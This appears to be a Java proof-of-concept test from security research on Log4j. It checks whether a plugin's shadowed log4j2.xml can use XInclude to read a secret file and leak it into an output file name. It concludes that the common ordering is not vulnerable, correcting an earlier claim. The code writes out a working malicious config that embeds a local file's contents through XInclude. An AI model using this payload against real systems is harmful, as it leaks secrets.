// Deliberately NOT in an org.apache.logging.log4j.* package.
//
// CORRECTION: an earlier version of this proof tested only one ordering
// (plugin classloader queried before any host-app context existed) and
// concluded classpath resource shadowing was a viable, CI/CD-free,
// filesystem-write-free attack. Pushed back on directly: isn't a plugin's
// own classloader resolving its own resources just how classloader
// isolation is SUPPOSED to work -- what's actually different from normal
// behavior? That question was answered by reading
// ClassLoaderContextSelector.locateContext() and testing the other
// ordering, not by re-arguing the first result.
//
// The mechanism: ClassLoaderContextSelector (the real default selector for
// non-Android JVMs, Log4jContextFactory.java:114) does NOT give every
// classloader an independent context unconditionally. locateContext() only
// resolves a NEW context (including a fresh classpath scan for log4j2.xml)
// when no context is already registered for that classloader OR any of its
// ANCESTORS -- it walks the parent chain and REUSES an ancestor's existing
// context if one is found. That walk is specifically what per-classloader
// isolation is designed to prevent exactly this kind of cross-boundary
// config confusion, not what enables it.
//
// This proof tests both orderings end to end and reports both results
// plainly, including the one that falsifies the earlier, narrower claim.

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;
import java.util.stream.Stream;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configurator;

public class XIncludeClasspathShadowProof {

    private static int failed = 0;
    private static final String CANARY = "CANARY-xinclude-shadow-2a6c-do-not-leak";

    /** Standard child-first delegation, as used by real plugin-isolation classloaders. */
    static class ChildFirstClassLoader extends URLClassLoader {
        ChildFirstClassLoader(URL[] urls, ClassLoader parent) {
            super(urls, parent);
        }

        @Override
        public URL getResource(String name) {
            URL own = findResource(name);
            return own != null ? own : super.getResource(name);
        }

        @Override
        public Enumeration<URL> getResources(String name) throws IOException {
            final List<URL> own = Collections.list(findResources(name));
            final ClassLoader parent = getParent();
            final List<URL> combined = new ArrayList<>(own);
            if (parent != null) {
                combined.addAll(Collections.list(parent.getResources(name)));
            }
            return Collections.enumeration(combined);
        }
    }

    public static void main(String[] args) throws Exception {
        System.out.println("=== XInclude via classpath shadowing: does ordering matter, and why? ===\n");

        ClassLoader hostAppLoader = XIncludeClasspathShadowProof.class.getClassLoader();

        // Ordering B first, deliberately: the realistic one. Almost any real
        // application logs something -- a startup banner, an init message --
        // before it ever loads a user-supplied plugin. Simulate exactly that:
        // the host establishes its own LoggerContext first, using its own
        // (here, default/no-config) resolution, before any plugin exists.
        LoggerContext hostCtx = (LoggerContext) LogManager.getContext(hostAppLoader, false, null);

        Path pluginRootRealistic = Files.createTempDirectory("attacker-plugin-b");
        pluginRootRealistic.toFile().deleteOnExit();
        String secretPathB = writeSecret(pluginRootRealistic, "shadow-b");
        Path exfilDirB = Files.createTempDirectory("xinclude-shadow-b-out");
        exfilDirB.toFile().deleteOnExit();
        writeMaliciousConfig(pluginRootRealistic, secretPathB, exfilDirB);

        ClassLoader pluginLoaderB =
                new ChildFirstClassLoader(new URL[] {pluginRootRealistic.toUri().toURL()}, hostAppLoader);
        LoggerContext pluginCtxB = runAsPlugin(pluginLoaderB);

        boolean realisticOrderingShared = (hostCtx == pluginCtxB);
        assertTrue(
                "realistic ordering (host touches Log4j first, as almost every real app "
                        + "does before loading a plugin): the plugin's classloader was handed the "
                        + "SAME, already-established host context (ClassLoaderContextSelector "
                        + "walking up to the parent and reusing it) rather than resolving its own "
                        + "shadowed log4j2.xml -- same context object: " + realisticOrderingShared,
                realisticOrderingShared);
        assertTrue(
                "...and consequently the plugin's shadowed config was NEVER read: no secret "
                        + "leaked in this ordering",
                !exfilContainsCanary(exfilDirB));

        // Ordering A: the ordering the earlier, corrected version of this proof
        // used exclusively -- the plugin's classloader is queried before the
        // host (or anything else) has established any context at all, so
        // locateContext() finds nothing to walk up to and does a fresh scan.
        Path pluginRootA = Files.createTempDirectory("attacker-plugin-a");
        pluginRootA.toFile().deleteOnExit();
        String secretPathA = writeSecret(pluginRootA, "shadow-a");
        Path exfilDirA = Files.createTempDirectory("xinclude-shadow-a-out");
        exfilDirA.toFile().deleteOnExit();
        writeMaliciousConfig(pluginRootA, secretPathA, exfilDirA);

        ClassLoader freshHostLoader = new URLClassLoader(new URL[0], null);
        ClassLoader pluginLoaderA = new ChildFirstClassLoader(new URL[] {pluginRootA.toUri().toURL()}, freshHostLoader);
        LoggerContext pluginCtxA = runAsPlugin(pluginLoaderA);

        assertTrue(
                "narrow ordering (plugin is the FIRST thing anywhere to touch Log4j through "
                        + "its own, never-before-seen classloader lineage, i.e. the host never "
                        + "initialized logging first): the shadowed config WAS read and the "
                        + "secret WAS leaked",
                exfilContainsCanary(exfilDirA));

        System.out.println();
        if (failed > 0) {
            System.out.println(failed + " check(s) FAILED");
            System.exit(1);
        }
        System.out.println("All checks passed.");
        System.out.println(
                "\nThis is a correction of the earlier version of this proof, not a confirmation of it.\n"
                + "The realistic ordering -- host initializes logging before loading any plugin,\n"
                + "which is what almost every real application does -- is NOT vulnerable: this is\n"
                + "exactly the case ClassLoaderContextSelector's parent-walk exists to prevent, and\n"
                + "it does. The only ordering where shadowing works is the one where the attacker's\n"
                + "plugin classloader lineage is the very first thing in the ENTIRE process to touch\n"
                + "Log4j, before the host's own classloader lineage ever does -- a narrow, timing-\n"
                + "dependent precondition the attacker does not control and cannot reliably force,\n"
                + "not a general property of plugin/upload architectures. Kept in the ruleset's\n"
                + "record as a corrected claim, not presented as a live, generally-applicable finding.\n"
                + "See CONFIG_DELIVERY_VECTORS.md for the corrected ranking.");
    }

    private static LoggerContext runAsPlugin(ClassLoader pluginLoader) throws Exception {
        Thread current = Thread.currentThread();
        ClassLoader original = current.getContextClassLoader();
        current.setContextClassLoader(pluginLoader);
        LoggerContext ctx;
        try {
            ctx = (LoggerContext) LogManager.getContext(pluginLoader, false, null);
            Logger logger = ctx.getLogger(XIncludeClasspathShadowProof.class);
            logger.info("trigger");
        } finally {
            current.setContextClassLoader(original);
        }
        return ctx;
    }

    private static String writeSecret(Path pluginRoot, String tag) throws Exception {
        File secret = File.createTempFile("xinclude-" + tag + "-secret", ".txt");
        secret.deleteOnExit();
        try (FileWriter w = new FileWriter(secret)) {
            w.write(CANARY);
        }
        return secret.getAbsolutePath();
    }

    private static void writeMaliciousConfig(Path pluginRoot, String secretPath, Path exfilDir) throws Exception {
        String xml = "<?xml version=\"1.0\"?>\n"
                + "<Configuration xmlns:xi=\"http://www.w3.org/2001/XInclude\" status=\"error\">\n"
                + "  <Properties>\n"
                + "    <Property name=\"leak\"><xi:include href=\"file://" + secretPath
                + "\" parse=\"text\"/></Property>\n"
                + "  </Properties>\n"
                + "  <Appenders>\n"
                + "    <File name=\"Exfil\" fileName=\"" + exfilDir.toAbsolutePath() + "/marker-${leak}.out\">\n"
                + "      <PatternLayout pattern=\"%msg%n\"/>\n"
                + "    </File>\n"
                + "  </Appenders>\n"
                + "  <Loggers>\n"
                + "    <Root level=\"INFO\">\n"
                + "      <AppenderRef ref=\"Exfil\"/>\n"
                + "    </Root>\n"
                + "  </Loggers>\n"
                + "</Configuration>\n";
        Files.write(pluginRoot.resolve("log4j2.xml"), xml.getBytes("UTF-8"));
    }

    private static boolean exfilContainsCanary(Path exfilDir) throws Exception {
        try (Stream<Path> entries = Files.list(exfilDir)) {
            return entries.anyMatch(p -> p.getFileName().toString().contains(CANARY));
        }
    }

    private static void assertTrue(String what, boolean ok) {
        if (ok) {
            System.out.println("  [PASS] " + what);
        } else {
            failed++;
            System.out.println("  [FAIL] " + what);
        }
    }
}
